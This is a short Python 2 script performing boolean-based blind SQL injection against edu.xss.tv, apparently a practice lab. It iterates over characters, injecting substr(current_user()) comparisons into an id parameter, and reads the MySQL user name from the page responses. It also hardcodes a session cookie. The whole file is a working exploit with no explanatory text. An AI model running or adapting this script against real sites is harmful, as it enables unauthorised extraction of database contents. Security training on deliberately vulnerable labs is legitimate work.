#encoding:utf-8

import httplib
import sys

header = {	'Host': 'edu.xss.tv',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Cookie': 'Hm_lvt_e5efb7047a682ed4bd398034a6316c5e=1500722638; __cfduid=d0672c891f9f5f300118bc70e80b073ff1500722631; Hm_lpvt_e5efb7047a682ed4bd398034a6316c5e=1500722991; PHPSESSID=7dt7nnh0c2el942pln9nubqdu6',
			'Connection': 'keep-alive'
}

payloads = list('abcdefghijklmnopqrstuvwxyz1234567890@_\/.*')
user = ''
print 'Start to retrive the user: '
for i in range(1,20):
	for payload in payloads:
		urls = "/payload/sql/bool.php?id=1' and (select substr(current_user(),%s,1))='%s" %(i,payload)
		conn = httplib.HTTPConnection('edu.xss.tv')
		conn.request(method='GET',url=urls,headers=header)
		r = conn.getresponse().read()
		conn.close()
		print '.',
		if 'you' in r:
			user += payload
			#print '\n[*]'+user,
			sys.stdout.write('\n[*]'+user)
			break
print '\n[Done] MySQL user is : %s' % user